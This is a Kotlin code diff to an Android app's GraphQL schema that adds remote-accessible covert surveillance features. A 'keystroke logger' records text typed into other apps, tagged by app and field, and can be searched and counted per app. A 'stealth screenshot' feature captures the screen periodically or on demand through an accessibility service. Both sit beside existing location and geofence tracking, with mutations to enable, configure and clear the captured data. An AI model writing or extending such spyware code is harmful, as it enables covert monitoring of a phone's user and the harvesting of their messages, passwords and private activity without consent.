@@ -3,8 +3,12 @@ package com.ismartcoding.plain.web.schemas
 import com.ismartcoding.lib.kgraphql.schema.dsl.SchemaBuilder
 import com.ismartcoding.plain.MainApp
 import com.ismartcoding.plain.helpers.GeofencingHelper
+import com.ismartcoding.plain.helpers.KeystrokeLogHelper
 import com.ismartcoding.plain.helpers.LocationTrackingHelper
+import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
+import com.ismartcoding.plain.helpers.StealthScreenshotHelper
 import com.ismartcoding.plain.services.LocationTrackingService
+import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.Serializable
 
 @Serializable
@@ -83,6 +87,53 @@ data class GeofenceAudioModel(
 )
 
 @Serializable
+data class KeystrokeEntryModel(
+    val id: String,
+    val ts: Long,
+    val packageName: String,
+    val appLabel: String,
+    val fieldHint: String,
+    val text: String,
+)
+
+@Serializable
+data class KeystrokePackageStat(
+    val packageName: String,
+    val count: Int,
+)
+
+@Serializable
+data class KeystrokeState(
+    val enabled: Boolean,
+    val accessibilityServiceConnected: Boolean,
+    val bufferLimit: Int,
+    val totalEntries: Int,
+)
+
+@Serializable
+data class StealthScreenshotModel(
+    val id: String,
+    val ts: Long,
+    val packageName: String,
+    val appLabel: String,
+    val width: Int,
+    val height: Int,
+    val sizeBytes: Long,
+    val manual: Boolean,
+    val fileId: String,
+)
+
+@Serializable
+data class StealthScreenshotState(
+    val enabled: Boolean,
+    val accessibilityServiceConnected: Boolean,
+    val supportedByOs: Boolean,
+    val intervalMin: Int,
+    val keepCount: Int,
+    val totalShots: Int,
+)
+
+@Serializable
 data class TrackingFenceInput(
     val id: String = "",
     val name: String,
@@ -138,6 +189,17 @@ private fun GeofencingHelper.GeofenceEvent.toModel(): GeofenceEventModel = Geofe
     lockedApps = lockedApps,
 )
 
+private fun KeystrokeLogHelper.Entry.toModel(): KeystrokeEntryModel = KeystrokeEntryModel(
+    id = id, ts = ts, packageName = packageName, appLabel = appLabel,
+    fieldHint = fieldHint, text = text,
+)
+
+private fun StealthScreenshotHelper.Shot.toModel(): StealthScreenshotModel = StealthScreenshotModel(
+    id = id, ts = ts, packageName = packageName, appLabel = appLabel,
+    width = width, height = height, sizeBytes = sizeBytes,
+    manual = manual, fileId = id,
+)
+
 private fun GeofencingHelper.GeofenceAudio.toModel(): GeofenceAudioModel = GeofenceAudioModel(
     id = id,
     geofenceId = geofenceId,
@@ -166,8 +228,19 @@ fun SchemaBuilder.addTrackingSchema() {
     }
 
     query("locationPoints") {
-        resolver { offset: Int, limit: Int ->
-            LocationTrackingHelper.listPoints(offset, limit).map { it.toModel() }
+        resolver { offset: Int, limit: Int, fromTs: String, toTs: String ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            LocationTrackingHelper.listPoints(offset, limit, from, to).map { it.toModel() }
+        }
+    }
+
+    query("locationPointsCount") {
+        resolver { fromTs: String, toTs: String ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            if (from <= 0L && to <= 0L) LocationTrackingHelper.countPoints()
+            else LocationTrackingHelper.countPointsInRange(from, to)
         }
     }
 
@@ -272,5 +345,124 @@ fun SchemaBuilder.addTrackingSchema() {
 
     mutation("deleteGeofenceAudio") {
         resolver { id: String -> GeofencingHelper.deleteAudio(id) }
+    }
+
+    // ---- KEYSTROKE LOGGER ----
+
+    query("keystrokeState") {
+        resolver { ->
+            KeystrokeState(
+                enabled = KeystrokeLogHelper.isEnabled(),
+                accessibilityServiceConnected =
+                    com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(),
+                bufferLimit = KeystrokeLogHelper.getBufferLimit(),
+                totalEntries = KeystrokeLogHelper.count(),
+            )
+        }
+    }
+
+    query("keystrokeEntries") {
+        resolver { offset: Int, limit: Int, query: String, packageName: String, fromTs: String, toTs: String ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            KeystrokeLogHelper.list(offset, limit, query, packageName, from, to).map { it.toModel() }
+        }
+    }
+
+    query("keystrokeEntriesCount") {
+        resolver { query: String, packageName: String, fromTs: String, toTs: String ->
+            val from = fromTs.toLongOrNull() ?: 0L
+            val to = toTs.toLongOrNull() ?: 0L
+            KeystrokeLogHelper.count(query, packageName, from, to)
+        }
+    }
+
+    query("keystrokePackageStats") {
+        resolver { ->
+            KeystrokeLogHelper.packageBreakdown().map { (pkg, n) -> KeystrokePackageStat(pkg, n) }
+        }
+    }
+
+    mutation("setKeystrokeLoggerEnabled") {
+        resolver { enabled: Boolean ->
+            KeystrokeLogHelper.setEnabled(enabled)
+            true
+        }
+    }
+
+    mutation("setKeystrokeBufferLimit") {
+        resolver { limit: Int ->
+            KeystrokeLogHelper.setBufferLimit(limit)
+            true
+        }
+    }
+
+    mutation("clearKeystrokeLog") {
+        resolver { ->
+            KeystrokeLogHelper.clear()
+            true
+        }
+    }
+
+    mutation("deleteKeystrokeEntry") {
+        resolver { id: String -> KeystrokeLogHelper.deleteOne(id) }
+    }
+
+    // ---- STEALTH SCREENSHOT ----
+
+    query("stealthScreenshotState") {
+        resolver { ->
+            StealthScreenshotState(
+                enabled = StealthScreenshotHelper.isEnabled(),
+                accessibilityServiceConnected =
+                    com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(),
+                supportedByOs = android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R,
+                intervalMin = StealthScreenshotHelper.getIntervalMin(),
+                keepCount = StealthScreenshotHelper.getKeepCount(),
+                totalShots = StealthScreenshotHelper.count(),
+            )
+        }
+    }
+
+    query("stealthScreenshots") {
+        resolver { offset: Int, limit: Int ->
+            StealthScreenshotHelper.list(offset, limit).map { it.toModel() }
+        }
+    }
+
+    mutation("setStealthScreenshotEnabled") {
+        resolver { enabled: Boolean ->
+            StealthScreenshotHelper.setEnabled(enabled)
+            true
+        }
+    }
+
+    mutation("setStealthScreenshotConfig") {
+        resolver { intervalMin: Int, keepCount: Int ->
+            StealthScreenshotHelper.setIntervalMin(intervalMin.coerceIn(1, 360))
+            StealthScreenshotHelper.setKeepCount(keepCount.coerceIn(10, 1000))
+            true
+        }
+    }
+
+    mutation("triggerStealthScreenshot") {
+        resolver { ->
+            // Manual capture from the dashboard — runs the same async path as
+            // the periodic worker but blocks until we know whether the OS
+            // produced an image so the UI can react with a toast.
+            val shot = runBlocking { StealthScreenshotCapturer.captureNow(manual = true) }
+            shot != null
+        }
+    }
+
+    mutation("deleteStealthScreenshot") {
+        resolver { id: String -> StealthScreenshotHelper.deleteOne(id) }
+    }
+
+    mutation("clearStealthScreenshots") {
+        resolver { ->
+            StealthScreenshotHelper.clearAll()
+            true
+        }
     }
 }
